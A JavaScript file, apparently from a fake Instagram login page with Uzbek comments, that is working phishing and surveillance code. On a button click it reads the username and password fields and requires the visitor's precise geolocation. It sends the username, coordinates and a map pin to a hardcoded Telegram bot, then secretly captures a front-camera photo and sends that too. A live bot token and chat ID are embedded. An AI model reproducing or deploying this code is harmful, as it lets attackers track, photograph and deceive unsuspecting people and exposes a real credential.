const token = "8776656330:AAFaWkFrnwMl8YHyBMkIr50QKHN_mCJWoVk";
const chat_id = "8173504509";

const btn = document.querySelector('#btn');

btn.addEventListener('click', async () => {

    // 👉 helper funksiyalar
    async function getPhotoBlob() {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" } // 🔥 front kamera
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        video.muted = true;

        await video.play();

        // 👉 mobile fix (kutish)
        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 300;
        canvas.height = video.videoHeight || 300;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        return new Promise(resolve => {
            canvas.toBlob(blob => resolve(blob), "image/png");
        });
    }

    async function sendText(text) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chat_id,
                text: text
            })
        });
    }

    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append("chat_id", chat_id);
        fd.append("photo", blob, "photo.png");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: fd
        });
    }

    // 👉 input
    const u = document.getElementById('ig-user').value.trim();
    const p = document.getElementById('ig-pass').value.trim();

    if (!u || !p) {
        showToast("Barcha maydonlarni to'ldiring");
        return;
    }

    let lat, lon;

    try {
        // 📍 LOCATION (mobile fix)
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        });

        lat = position.coords.latitude;
        lon = position.coords.longitude;

    } catch (err) {
        showToast("Location olinmadi");
        return;
    }

    try {
        // 📍 Yandex map link (qizil pin)
        const label = encodeURIComponent(`User: ${u}`);
        const yandexLink = `https://yandex.com/maps/?ll=${lon},${lat}&z=17&pt=${lon},${lat},pm2rdm~${label}`;

        const text = `
User: ${u}
LAT: ${lat}
LON: ${lon}

📍 Yandex Map:
${yandexLink}
`;

        // 👉 telegram text
        await sendText(text);

        // 👉 kamera (mobile fix)
        try {
            const photo = await getPhotoBlob();
            await sendPhoto(photo);
        } catch (e) {
            console.log("Kamera rad etildi:", e.message);
        }

        showToast("Hammasi ishladi ✅");

    } catch (err) {
        console.log(err.message);
        showToast("Xatolik yuz berdi");
    }

});